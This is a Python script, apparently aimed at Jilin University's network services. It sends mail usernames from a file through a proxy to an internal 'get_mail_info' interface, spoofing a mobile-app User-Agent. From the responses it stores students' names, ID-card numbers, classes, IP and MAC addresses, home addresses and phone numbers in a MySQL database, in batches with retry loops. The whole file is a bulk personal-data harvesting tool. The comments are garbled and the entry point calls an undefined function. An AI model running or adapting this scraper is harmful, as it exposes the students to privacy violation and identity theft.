import json
import pymysql.cursors
import urllib.request
import time

# 鐧诲綍淇℃伅瀛樺湪鏂囦欢閲岄槻娉勯湶
connect_data = open("user.txt")
data = connect_data.read().split('\n')

# 杩炴帴鏁版嵁搴?
connections = pymysql.connect(host=data[0], user=data[1], password=data[2], charset=data[3])


def communicate(url, postdata=None, **add_cookies):
    request = urllib.request.Request(url, postdata)
    for key, value in add_cookies.items():
        request.add_header(key, value)

    result = urllib.request.urlopen(request).read().decode()
    return json.loads(result)


def get_info(username, cursor):
    info_url = 'http://202.98.18.57:18080/webservice/m/api/proxy'
    postdata = 'link=http%3A%2F%2Fip.jlu.edu.cn%2Fpay%2Finterface_mobile.php%3Fmenu%3Dget_mail_info%26mail%3D' \
               + username
    postdata = postdata.encode()
    add_headers = {
        'Cookie': 'JSESSIONID=' + '',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': 'mjida/2.41 CFNetwork/808.2.16 Darwin/16.3.0'
    }

    result = communicate(info_url, postdata, **add_headers)
    stu_info = result['resultValue']['content']
    stu_info = json.loads(stu_info)
    if not stu_info:
        raise DeprecationWarning
    ip = stu_info.get('ip', [''])[0]
    ip_info = stu_info.get('ip_info', {}).get(ip, {})
    infos = [
        stu_info.get('mail', username),
        stu_info.get('name', ' '),
        stu_info.get('zhengjianhaoma', ' '),
        stu_info.get('class', ''),
        ip,
        ip_info.get('id_name', ' '),
        ip_info.get('campus', ' '),
        ip_info.get('net_area', ' '),
        ip_info.get('home_addr', ' '),
        ip_info.get('phone', ' '),
        ip_info.get('mac', ' ')
    ]
    cursor.execute('insert into stu2 values(%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s);', infos)
    connections.commit()


def main(mails_):
    mm = mails_
    while True:
        flag = 0
        while flag < 500:
            flag += 1
            mail = next(mm)
            try:
                with connections.cursor() as cursor:
                    cursor.execute('use infos')
                    get_info(mail, cursor)
                    print(mail + '  success')
            except Exception as e:
                mm = (i for i in list(mm) + [mail])
                time.sleep(30)
        time.sleep(15)


if __name__ == '__main__':
    with open('vv.txt') as f:
        mails = (i.split()[0] for i in f.readlines())
    main2(mails)
